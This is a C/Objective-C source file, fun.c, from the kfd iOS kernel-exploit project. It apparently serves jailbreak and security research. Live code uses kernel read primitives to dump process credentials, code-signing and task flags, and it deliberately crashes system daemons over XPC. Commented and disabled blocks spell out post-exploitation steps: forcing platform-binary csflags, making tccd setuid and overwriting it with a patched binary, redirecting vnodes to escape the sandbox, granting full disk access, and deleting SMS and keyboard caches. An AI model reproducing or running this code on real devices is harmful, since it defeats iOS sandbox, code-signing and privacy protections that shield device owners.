//
//  fun.c
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/07/25.
//

#include "krw.h"
#include "offsets.h"
#include <sys/stat.h>
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <sys/mount.h>
#include <sys/stat.h>
#include <sys/attr.h>
#include <sys/snapshot.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include "proc.h"
#include "vnode.h"
#include "grant_full_disk_access.h"
#include "thanks_opa334dev_htrowii.h"
#include "utils.h"
#include "cs_blobs.h"
#include "helpers.h"

int funUcred(uint64_t proc) {
    uint64_t proc_ro = kread64(proc + off_p_proc_ro);
    uint64_t ucreds = kread64(proc_ro + off_p_ro_p_ucred);
    
    uint64_t cr_label_pac = kread64(ucreds + off_u_cr_label);
    uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
    printf("[i] self ucred->cr_label: 0x%llx\n", cr_label);
    
    uint64_t cr_posix_p = ucreds + off_u_cr_posix;
    printf("[i] self ucred->posix_cred->cr_uid: %u\n", kread32(cr_posix_p + off_cr_uid));
    printf("[i] self ucred->posix_cred->cr_ruid: %u\n", kread32(cr_posix_p + off_cr_ruid));
    printf("[i] self ucred->posix_cred->cr_svuid: %u\n", kread32(cr_posix_p + off_cr_svuid));
    printf("[i] self ucred->posix_cred->cr_ngroups: %u\n", kread32(cr_posix_p + off_cr_ngroups));
    printf("[i] self ucred->posix_cred->cr_groups: %u\n", kread32(cr_posix_p + off_cr_groups));
    printf("[i] self ucred->posix_cred->cr_rgid: %u\n", kread32(cr_posix_p + off_cr_rgid));
    printf("[i] self ucred->posix_cred->cr_svgid: %u\n", kread32(cr_posix_p + off_cr_svgid));
    printf("[i] self ucred->posix_cred->cr_gmuid: %u\n", kread32(cr_posix_p + off_cr_gmuid));
    printf("[i] self ucred->posix_cred->cr_flags: %u\n", kread32(cr_posix_p + off_cr_flags));

    return 0;
}


int funCSFlags(char* process) {
    pid_t pid = getPidByName(process);
    uint64_t proc = getProc(pid);
    
    uint64_t proc_ro = kread64(proc + off_p_proc_ro);
    uint32_t csflags = kread32(proc_ro + off_p_ro_p_csflags);
    printf("[i] %s proc->proc_ro->p_csflags: 0x%x\n", process, csflags);
    
#define TF_PLATFORM 0x400

#define CS_GET_TASK_ALLOW    0x0000004    /* has get-task-allow entitlement */
#define CS_INSTALLER        0x0000008    /* has installer entitlement */

#define    CS_HARD            0x0000100    /* don't load invalid pages */
#define    CS_KILL            0x0000200    /* kill process if it becomes invalid */
#define CS_RESTRICT        0x0000800    /* tell dyld to treat restricted */

#define CS_PLATFORM_BINARY    0x4000000    /* this is a platform binary */

#define CS_DEBUGGED         0x10000000  /* process is currently or has previously been debugged and allowed to run with invalid pages */
    
//    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_DEBUGGED) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
//    sleep(3);
//    kwrite32(proc_ro + off_p_ro_p_csflags, csflags);
    
    return 0;
}

int funTask(char* process) {
    pid_t pid = getPidByName(process);
    uint64_t proc = getProc(pid);
    printf("[i] %s proc: 0x%llx\n", process, proc);
    uint64_t proc_ro = kread64(proc + off_p_proc_ro);
    
    uint64_t pr_proc = kread64(proc_ro + off_p_ro_pr_proc);
    printf("[i] %s proc->proc_ro->pr_proc: 0x%llx\n", process, pr_proc);
    
    uint64_t pr_task = kread64(proc_ro + off_p_ro_pr_task);
    printf("[i] %s proc->proc_ro->pr_task: 0x%llx\n", process, pr_task);
    
    uint32_t t_flags = kread32(pr_task + off_task_t_flags);
    printf("[i] %s task->t_flags: 0x%x\n", process, t_flags);
    
    
    /*
     * RO-protected flags:
     */
    #define TFRO_PLATFORM                   0x00000400                      /* task is a platform binary */
    #define TFRO_FILTER_MSG                 0x00004000                      /* task calls into message filter callback before sending a message */
    #define TFRO_PAC_EXC_FATAL              0x00010000                      /* task is marked a corpse if a PAC exception occurs */
    #define TFRO_PAC_ENFORCE_USER_STATE     0x01000000                      /* Enforce user and kernel signed thread state */
    
    uint32_t t_flags_ro = kread32(proc_ro + off_p_ro_t_flags_ro);
    printf("[i] %s proc->proc_ro->t_flags_ro: 0x%x\n", process, t_flags_ro);
    
    return 0;
}

//uint64_t fun_ipc_entry_lookup(mach_port_name_t port_name) {
//    uint64_t proc = getProc(getpid());
//    uint64_t proc_ro = kread64(proc + off_p_proc_ro);
//    
//    uint64_t pr_proc = kread64(proc_ro + off_p_ro_pr_proc);
//    printf("[i] self proc->proc_ro->pr_proc: 0x%llx\n", pr_proc);
//    
//    uint64_t pr_task = kread64(proc_ro + off_p_ro_pr_task);
//    printf("[i] self proc->proc_ro->pr_task: 0x%llx\n", pr_task);
//    
//    uint64_t itk_space_pac = kread64(pr_task + off_task_itk_space);
//    uint64_t itk_space = itk_space_pac | 0xffffff8000000000;
//    printf("[i] self task->itk_space: 0x%llx\n", itk_space);
//    
//    uint32_t port_index = MACH_PORT_INDEX(port_name);
//    uint32_t table_size = kread32(itk_space + 0x14);
//    printf("[i] table_size: 0x%x, port_index: 0x%x\n", table_size, port_index);
//    if (port_index >= table_size) {
//        printf("[-] invalid port name? 0x%x\n", port_name);
//    }
//    
//    uint64_t is_table = kread64_smr(itk_space + off_ipc_space_is_table);
//    printf("[i] self task->itk_space->is_table: 0x%llx\n", is_table);
//    
//    uint64_t entry = is_table + port_index * 0x18/*SIZE(ipc_entry)*/;
//    printf("[i] entry: 0x%llx\n", entry);
//    
//    uint64_t object_pac = kread64(entry + off_ipc_entry_ie_object);
//    uint64_t object = object_pac | 0xffffff8000000000;
//    
//    uint32_t ip_bits = kread32(object + off_ipc_object_io_bits);
//    uint32_t ip_refs = kread32(object + off_ipc_object_io_references);
//    
//    uint64_t kobject_pac = kread64(object + off_ipc_port_ip_kobject);
//    uint64_t kobject = kobject_pac | 0xffffff8000000000;
//    printf("[i] ipc_port: ip_bits 0x%x, ip_refs 0x%x\n", ip_bits, ip_refs);
//    printf("[i] ip_kobject: 0x%llx\n", kobject);
//    
//    return kobject;
//}

static uint32_t
extract32(uint32_t val, unsigned start, unsigned len) {
    return (val >> start) & (~0U >> (32U - len));
}

typedef mach_port_t io_object_t;
typedef io_object_t io_service_t, io_connect_t, io_registry_entry_t;
extern const mach_port_t kIOMasterPortDefault;
#define kIODeviceTreePlane "IODeviceTree"
CFTypeRef IORegistryEntryCreateCFProperty(io_registry_entry_t entry, CFStringRef key, CFAllocatorRef allocator, uint32_t options);
#define IO_OBJECT_NULL ((io_object_t)0)
#define OS_STRING_LEN(a) extract32(a, 14, 18)

typedef char io_string_t[512];
io_registry_entry_t IORegistryEntryFromPath(mach_port_t master, const io_string_t path);


//static uint64_t
//lookup_io_object(io_object_t object) {
//    return fun_ipc_entry_lookup(object);
//}
//
//static uint64_t
//get_of_dict(io_registry_entry_t nvram_entry) {
//    uint64_t nvram_object = fun_ipc_entry_lookup(nvram_entry);
//    
//    //IODTNVRAM::IODTNVRAM(OSMetaClass const*)+24
//    return kread64(nvram_object + 0xc0);    //io_dt_nvram_of_dict_off = 0xC0;
//}

uint64_t print_key_value_in_os_dict(uint64_t os_dict) {
    uint64_t os_dict_entry_ptr, string_ptr, val_ptr = 0;
    uint32_t os_dict_cnt, cur_key_len, cur_val_len;
    size_t max_key_len = 1024;
    struct {
        uint64_t key, val;
    } os_dict_entry;
    char *cur_key;

    if(((cur_key = malloc(max_key_len)) != NULL)) {
        //https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.41.9/libkern/libkern/c%2B%2B/OSDictionary.h#L138
        os_dict_entry_ptr = kread64(os_dict + 0x20/*OS_DICTIONARY_DICT_ENTRY_OFF*/);
        if(os_dict_entry_ptr != 0) {
            os_dict_entry_ptr = os_dict_entry_ptr | 0xffffff8000000000;
            printf("[i] os_dict_entry_ptr: 0x%llx\n", os_dict_entry_ptr);
            os_dict_cnt = kread32(os_dict + 0x14/*OS_DICTIONARY_COUNT_OFF*/);
            if(os_dict_cnt != 0) {
                printf("[i] os_dict_cnt: 0x%x\n", os_dict_cnt);
                while(os_dict_cnt-- != 0) {
                    kreadbuf(os_dict_entry_ptr + os_dict_cnt * sizeof(os_dict_entry), &os_dict_entry, sizeof(os_dict_entry));
                    //printf("key: 0x%llx, val: 0x%llx\n", os_dict_entry.key, os_dict_entry.val);
                    
                    //KEY
                    //https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.41.9/libkern/libkern/c%2B%2B/OSString.h#L108
                    cur_key_len = kread32(os_dict_entry.key + 0xc/*OS_STRING_LEN_OFF*/);
                    if(cur_key_len == 0) {
                        break;
                    }
                    cur_key_len = OS_STRING_LEN(cur_key_len);
                    string_ptr = kread64(os_dict_entry.key + 0x10/*OS_STRING_STRING_OFF*/);
                    if(string_ptr == 0) {
                        break;
                    }
                    string_ptr = string_ptr | 0xffffff8000000000;
                    kreadbuf(string_ptr, cur_key, cur_key_len);
                    printf("[+] key_str: %s, key_str_len: 0x%x\n", cur_key, cur_key_len);
                    
                    
                    //VALUE
//                    HexDump(os_dict_entry.val, 100);
                    cur_val_len = kread32(os_dict_entry.val + 0xc/*OS_STRING_LEN_OFF*/);
                    if(cur_val_len == 0) {
                        printf("[-] cur_val_len = 0\n");
                        continue;
                    }
                    val_ptr = kread64(os_dict_entry.val + 0x18/*?*/);
                    val_ptr = val_ptr | 0xffffff8000000000;
                    if(val_ptr == 0) {
                        printf("[-] val_ptr = 0\n");
                        continue;
                    }
                    
                    char* cur_val = malloc(cur_val_len);
                    kreadbuf(val_ptr, cur_val, cur_val_len);
                    printf("[+] val_str: %s, val_str_len: 0x%x\n", cur_val, cur_val_len);
                    free(cur_val);
                }
            }
        }
        free(cur_key);
    }
    return 0;
}


//uint64_t fun_nvram_dump(void) {
//
//    io_registry_entry_t nvram_entry = IORegistryEntryFromPath(kIOMasterPortDefault, kIODeviceTreePlane ":/options");
//    
//    if(nvram_entry != IO_OBJECT_NULL) {
//        printf("[i] nvram_entry: 0x%x\n", nvram_entry);
//
//        uint64_t of_dict = get_of_dict(nvram_entry);
//        printf("[i] of_dict: 0x%llx\n", of_dict);
//        
//        print_key_value_in_os_dict(of_dict);
//    }
//    
//    return 0;
//}

void fix_exploit(void) {
    _offsets_init();
    pid_t myPid = getpid();
    uint64_t selfProc = getProc(myPid);
    funUcred(selfProc);
}

void backboard_respring(void) {
    xpc_crasher("com.apple.cfprefsd.daemon");
    xpc_crasher("com.apple.backboard.TouchDeliveryPolicyServer");
}

void respring(void) {
    xpc_crasher("com.apple.frontboard.systemappservices");
}

int do_fun(void) {
    
//    _offsets_init();
//    
//    uint64_t kslide = get_kslide();
//    uint64_t kbase = 0xfffffff007004000 + kslide;
//    printf("[i] Kernel base: 0x%llx\n", kbase);
//    printf("[i] Kernel slide: 0x%llx\n", kslide);
//    uint64_t kheader64 = kread64(kbase);
//    printf("[i] Kernel base kread64 ret: 0x%llx\n", kheader64);
//    
//    pid_t myPid = getpid();
//    uint64_t selfProc = getProc(myPid);
//    printf("[i] self proc: 0x%llx\n", selfProc);
//    
//    funUcred(selfProc);
//    funProc(selfProc);
//    uint64_t photoShutter_vnode = funVnodeHide("/System/Library/Audio/UISounds/photoShutter.caf");
//    funVnodeReveal(photoShutter_vnode);
//    funCSFlags("launchd");
//    funTask("kfd");
//    
//    //Patch
//    funVnodeChown("/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 501, 501);
//    //Restore
//    funVnodeChown("/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0, 0);
//    
//    
//    //Patch
//    funVnodeChmod("/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0107777);
//    //Restore
//    funVnodeChmod("/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
//    
//    mach_port_t host_self = mach_host_self();
//    printf("[i] mach_host_self: 0x%x\n", host_self);
//    fun_ipc_entry_lookup(host_self);
    
//    printf("[!] fun_proc_dump_entitlements: tccd\n");
//    fun_proc_dump_entitlements(getProcByName("tccd"));

//    printf("[!] fun_vnode_dump_entitlements: ReportCrash\n");
//    fun_vnode_dump_entitlements("/System/Library/CoreServices/ReportCrash");
//    
//    printf("[!] fun_nvram_dump\n");
//    fun_nvram_dump();
    
//    VarMobileWriteTest();
//    VarMobileRemoveTest();
//    VarMobileWriteFolderTest();
//    VarMobileRemoveFolderTest();
    
//    setSuperviseMode(true);
//    removeSMSCache();
    
//    removeKeyboardCache();
    
    //Patch
//    regionChanger(@"US", @"LL/A");
    //Restore (KOREAN) KH,KH/A
//    regionChanger(@"KH", @"KH/A");
    
//    ResSet16(2796, 1290);
//    setSuperviseMode(true);
    
//    ResSet16();
//    removeSMSCache();


//    VarMobileWriteTest();
    //How to Remove: If write succeed, first REBOOT. disable VarMobileWriteTest() function and enable VarMobileRemoveTest. it should work remove file.
//    VarMobileRemoveTest();
    
//    funVnodeIterateByPath("/System/Library");
//    uint64_t var_vnode = getVnodeVar();
//    funVnodeIterateByVnode(var_vnode);
    
//    uint64_t var_mobile_vnode = getVnodeVarMobile();
//    printf("[i] var_mobile_vnode: 0x%llx\n", var_mobile_vnode);
    
//    uint64_t var_tmp_vnode = findChildVnodeByVnode(var_vnode, "tmp");
//    printf("[i] var_tmp_vnode: 0x%llx\n", var_tmp_vnode);
    
//    uint64_t var_mobile_library_vnode = findChildVnodeByVnode(var_mobile_vnode, "Library");
//    printf("[i] var_mobile_library_vnode: 0x%llx\n", var_mobile_library_vnode);
//    uint64_t var_mobile_library_preferences_vnode = findChildVnodeByVnode(var_mobile_library_vnode, "Preferences");
//    printf("[i] var_mobile_library_preferences_vnode: 0x%llx\n", var_mobile_library_preferences_vnode);
//    sleep(1);
//    NSString *mntPath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted"];
//    [[NSFileManager defaultManager] removeItemAtPath:mntPath error:nil];
//    [[NSFileManager defaultManager] createDirectoryAtPath:mntPath withIntermediateDirectories:NO attributes:nil error:nil];
//    uint64_t orig_to_v_data = funVnodeRedirectFolderFromVnode(mntPath.UTF8String, var_mobile_library_preferences_vnode);
//    NSArray* dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
//    NSLog(@"mntPath directory list: %@", dirs);
    
//    [@"Hello, this is an example file?" writeToFile:[mntPath stringByAppendingString:@"/out_of_sandbox"] atomically:YES encoding:NSUTF8StringEncoding error:nil];
//    funVnodeIterateByVnode(var_tmp_vnode);
//    remove([mntPath stringByAppendingString:@"/out_of_sandbox"].UTF8String);
//    unlink([mntPath stringByAppendingString:@"/out_of_sandbox"].UTF8String);
//
//    funVnodeUnRedirectFolder(mntPath.UTF8String, orig_to_v_data);
//    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
//    NSLog(@"mntPath directory list: %@", dirs);
    
    
    
//    funVnodeOverwrite2("/System/Library/Audio/UISounds/photoShutter.caf", [NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/AAAA.bin"].UTF8String);
    
//    funVnodeOverwriteFile("/System/Library/Audio/UISounds/photoShutter.caf", [NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/AAAA.bin"].UTF8String);
//
//    grant_full_disk_access(^(NSError* error) {
//        if(error != nil)
//            NSLog(@"[-] grant_full_disk_access returned error: %@", error);
//    });
    
//    NSArray* dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/mobile" error:NULL];
//    NSLog(@"/var/mobile directory list: %@", dirs);
    
//    patch_installd();

        
//    Redirect Folders: NSHomeDirectory() + @"/Documents/mounted" -> "/var/mobile/Library/Caches/com.apple.keyboards"
//    NSString *mntPath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted"];
//    [[NSFileManager defaultManager] removeItemAtPath:mntPath error:nil];
//    [[NSFileManager defaultManager] createDirectoryAtPath:mntPath withIntermediateDirectories:NO attributes:nil error:nil];
//    funVnodeRedirectFolder(mntPath.UTF8String, "/System/Library"); //<- should NOT be work.
//    funVnodeRedirectFolder(mntPath.UTF8String, "/var/mobile/Library/Caches/com.apple.keyboards"); //<- should be work.
//    NSArray* dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
//    NSLog(@"mntPath directory list: %@", dirs);
    
#if 0
    Redirect Folders: NSHomeDirectory() + @"/Documents/mounted" -> /var/mobile
    funVnodeResearch(mntPath.UTF8String, mntPath.UTF8String);
    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
    NSLog(@"[i] /var/mobile dirs: %@", dirs);
    
    
    
    
    funVnodeOverwriteFile(mntPath.UTF8String, "/var/mobile/Library/Caches/com.apple.keyboards");
    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/AAAA.bin"] toPath:[NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted/images/BBBB.bin"] error:nil];
    
    symlink("/System/Library/PrivateFrameworks/TCC.framework/Support/", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/Support"].UTF8String);
    mount("/System/Library/PrivateFrameworks/TCC.framework/Support/", mntPath, NULL, MS_BIND | MS_REC, NULL);
    printf("mount ret: %d\n", mount("apfs", mntpath, 0, &mntargs))
    funVnodeChown("/System/Library/PrivateFrameworks/TCC.framework/Support/", 501, 501);
    funVnodeChmod("/System/Library/PrivateFrameworks/TCC.framework/Support/", 0107777);
    
    funVnodeOverwriteFile(mntPath.UTF8String, "/");
    
    
    for(NSString *dir in dirs) {
        NSString *mydir = [mntPath stringByAppendingString:@"/"];
        mydir = [mydir stringByAppendingString:dir];
        int fd_open = open(mydir.UTF8String, O_RDONLY);
        printf("open %s, ret: %d\n", mydir.UTF8String, fd_open);
        if(fd_open != -1) {
            NSArray* dirs2 = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mydir error:NULL];
            NSLog(@"/var/%@ directory: %@", dir, dirs2);
        }
        close(fd_open);
    }
    printf("open ret: %d\n", open([mntPath stringByAppendingString:@"/mobile/Library"].UTF8String, O_RDONLY));
    printf("open ret: %d\n", open([mntPath stringByAppendingString:@"/containers"].UTF8String, O_RDONLY));
    printf("open ret: %d\n", open([mntPath stringByAppendingString:@"/mobile/Library/Preferences"].UTF8String, O_RDONLY));
    printf("open ret: %d\n", open("/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches", O_RDONLY));
    
    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:[mntPath stringByAppendingString:@"/mobile"] error:NULL];
    NSLog(@"/var/mobile directory: %@", dirs);
    
    [@"Hello, this is an example file!" writeToFile:[mntPath stringByAppendingString:@"/Hello.txt"] atomically:YES encoding:NSUTF8StringEncoding error:nil];
    funVnodeOverwriteFile("/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", AAAApath.UTF8String);
    funVnodeChown("/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 501, 501);
    funVnodeOverwriteFile(AAAApath.UTF8String, BBBBpath.UTF8String);
    funVnodeOverwriteFile("/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", "/System/Library/AppPlaceholders/Tips.app/AppIcon60x60@2x.png");
    
    xpc_crasher("com.apple.tccd");
    xpc_crasher("com.apple.tccd");
    sleep(10);
    funUcred(getProc(getPidByName("tccd")));
    funProc(getProc(getPidByName("tccd")));
    funVnodeChmod("/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
    
    
    funVnodeOverwrite(AAAApath.UTF8String, AAAApath.UTF8String);
    
    funVnodeOverwrite(selfProc, "/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", copyToAppDocs.UTF8String);


Overwrite tccd:
    NSString *copyToAppDocs = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/tccd_patched.bin"];
    remove(copyToAppDocs.UTF8String);
    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/tccd_patched.bin"] toPath:copyToAppDocs error:nil];
    chmod(copyToAppDocs.UTF8String, 0755);
    funVnodeOverwrite(selfProc, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", [copyToAppDocs UTF8String]);
    
    xpc_crasher("com.apple.tccd");
    xpc_crasher("com.apple.tccd");
#endif
    
    return 0;
}
